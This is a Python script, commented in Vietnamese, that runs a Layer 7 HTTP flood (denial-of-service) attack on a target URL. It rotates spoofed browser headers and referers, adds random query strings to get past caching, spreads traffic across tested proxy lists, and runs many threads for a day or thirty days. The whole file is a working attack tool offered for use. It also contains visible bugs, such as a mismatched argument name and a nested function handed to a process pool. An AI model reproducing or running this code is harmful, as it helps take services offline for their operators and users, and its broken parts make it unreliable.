import sys
import subprocess
import random
import time
import logging
import argparse
import re
import requests
from concurrent.futures import ThreadPoolExecutor
from multiprocessing import Pool, Manager
from collections import Counter
from urllib.parse import urlparse
import string

# Cấu hình logging
logging.basicConfig(level=logging.INFO, filename="ddos.log", format="%(asctime)s - %(message)s")

# Danh sách User-Agent hiện đại (2025)
USER_AGENTS = [
    # Desktop - Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Edge/122.0.0.0 Safari/537.36",
    
    # Desktop - macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1; rv:123.0) Gecko/20100101 Firefox/123.0",

    # Desktop - Linux
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",

    # Mobile - iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",

    # Mobile - Android
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",

    # Other devices
    "Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 OPR/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Vivaldi/6.5 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/122.0.0.0 Mobile Safari/537.36"
]

# Danh sách Referer ngẫu nhiên
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/"
]

# Danh sách Accept-Language
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8",
    "fr-FR,fr;q=0.9",
    "es-ES,es;q=0.9",
    "zh-CN,zh;q=0.9"
]

# Danh sách proxy file
proxy_files = ["proxies1.txt", "proxies2.txt", "proxies3.txt", "proxies4.txt"]

# Cài đặt module
def install_module(module_name):
    try:
        __import__(module_name)
        logging.info(f"Module {module_name} already installed.")
    except ImportError:
        logging.info(f"Module {module_name} not found. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
            logging.info(f"Module {module_name} installed successfully.")
        except subprocess.CalledProcessError:
            logging.error(f"Failed to install {module_name}. Please install it manually.")
            sys.exit(1)

install_module("requests")

# Kiểm tra định dạng URL
def is_valid_url(url):
    return re.match(r"^https?://[\w\.-]+(?:\:\d+)?(?:/[\w\.-]*)*$", url)

# Kiểm tra định dạng proxy
def is_valid_proxy(proxy):
    return re.match(r"^(?:\w+:\w+@)?[\w\.-]+:\d+$", proxy)

# Kiểm tra proxy
def test_proxy(proxy):
    try:
        response = requests.get("https://httpbin.org/ip", proxies=proxy, timeout=5)
        return response.status_code == 200
    except:
        return False

# Đọc proxy
def load_proxies():
    proxies = set()
    for file_name in proxy_files:
        try:
            with open(file_name, "r") as file:
                for line in file:
                    proxy = line.strip()
                    if proxy and is_valid_proxy(proxy):
                        proxies.add(proxy)
                    elif proxy:
                        logging.warning(f"Invalid proxy format: {proxy}")
        except FileNotFoundError:
            logging.warning(f"File {file_name} not found. Skipping...")
    valid_proxies = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(test_proxy, [{"http": p, "https": p} for p in proxies])
        valid_proxies = [p for p, valid in zip(proxies, results) if valid]
    return [{"http": p, "https": p} for p in valid_proxies]

# Tạo tham số query ngẫu nhiên
def generate_random_query():
    length = random.randint(5, 15)
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# Gửi yêu cầu Layer 7
def send_request(proxy, target, session):
    try:
        # Thêm tham số query ngẫu nhiên
        parsed_url = urlparse(target)
        query = f"?q={generate_random_query()}" if parsed_url.query else f"&q={generate_random_query()}"
        full_url = target + query

        # Random headers
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice(["*/*", "text/html,application/xhtml+xml"]),
            "Accept-Language": random.choice(ACCEPT_LANGUAGES),
            "Referer": random.choice(REFERERS),
            "Cache-Control": random.choice(["no-cache", "max-age=0"]),
            "Connection": "keep-alive"
        }

        # Gửi yêu cầu GET
        response = session.get(full_url, headers=headers, proxies=proxy, timeout=5)
        logging.info(f"Sent request to {full_url}: {response.status_code}")
        return response.status_code
    except requests.exceptions.ProxyError:
        logging.error(f"Proxy error with {proxy}")
        return "proxy_error"
    except requests.exceptions.Timeout:
        logging.error("Request timed out")
        return "timeout"
    except requests.exceptions.TooManyRedirects:
        logging.error("Too many redirects")
        return "redirect_error"
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 429:
            logging.warning("Rate limit detected (429)")
            time.sleep(random.uniform(1, 3))
        elif e.response.status_code == 403:
            logging.warning("Access forbidden (403)")
        elif e.response.status_code == 503:
            logging.warning("Service unavailable (503)")
        return "http_error"
    except requests.exceptions.RequestException as e:
        logging.error(f"Network error: {e}")
        return "network_error"
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return "unexpected_error"

# Tấn công lặp vô hạn
def attack_batch(proxy, target, duration, max_workers):
    status_codes = Counter()
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        session = requests.Session()
        while time.time() - start_time < duration:
            futures = [executor.submit(send_request, proxy, target, session) for _ in range(max_workers)]
            for future in futures:
                try:
                    status_codes[future.result()] += 1
                except Exception:
                    status_codes["thread_error"] += 1
            time.sleep(random.uniform(0.1, 0.5))
    return status_codes

# Phần chính
def main():
    # Nhập target
    target = input("Enter target URL (e.g., https://example.com/): ").strip()
    if not is_valid_url(target):
        print("Invalid URL format. Exiting...")
        sys.exit(1)

    # Nhập số thread tấn công
    while True:
        try:
            max_workers = int(input("Enter number of attack threads (1-500, recommended 50): ").strip())
            if 1 <= max_workers <= 500:
                if max_workers > 200:
                    print("Warning: High thread count (>200) may overload your system.")
                break
            else:
                print("Please enter a number between 1 and 500.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")
    if not max_workers:
        print("No valid thread count provided. Defaulting to 50.")
        max_workers = 50

    # Chọn thời gian chạy
    print("Select duration:")
    print("1. 1 day (24 hours)")
    print("2. 30 days")
    choice = input("Enter choice (1 or 2): ").strip()
    if choice == "1":
        duration = 86400
    elif choice == "2":
        duration = 2592000
    else:
        print("Invalid choice. Defaulting to 1 day.")
        duration = 86400

    # Cấu hình tham số
    parser = argparse.ArgumentParser()
    parser.add_argument("--max-processes", type=int, default=10)
    args = parser.parse_args()

    # Tải proxy
    proxies = load_proxies()
    if not proxies:
        logging.error("No valid proxies loaded. Exiting...")
        sys.exit(1)

    # Chạy tấn công
    manager = Manager()
    error_list = manager.list()
    def attack_batch_wrapper(proxy, error_list):
        try:
            result = attack_batch(proxy, target, duration, max_workers)
            logging.info(f"Proxy {proxy['http']}: {result}")
            return result
        except Exception as e:
            error_list.append(f"Proxy {proxy}: {e}")
            return Counter({"process_error": 1})

    with Pool(processes=args.max_process) as pool:
        results = pool.starmap(attack_batch_wrapper, [(p, error_list) for p in proxies])

    # Tổng hợp kết quả
    total_status = Counter()
    for res in results:
        total_status.update(res)
    logging.info("Summary: %s", dict(total_status))
    if error_list:
        logging.error("Errors encountered:")
        for error in error_list:
            logging.error(error)

if __name__ == "__main__":
    main()
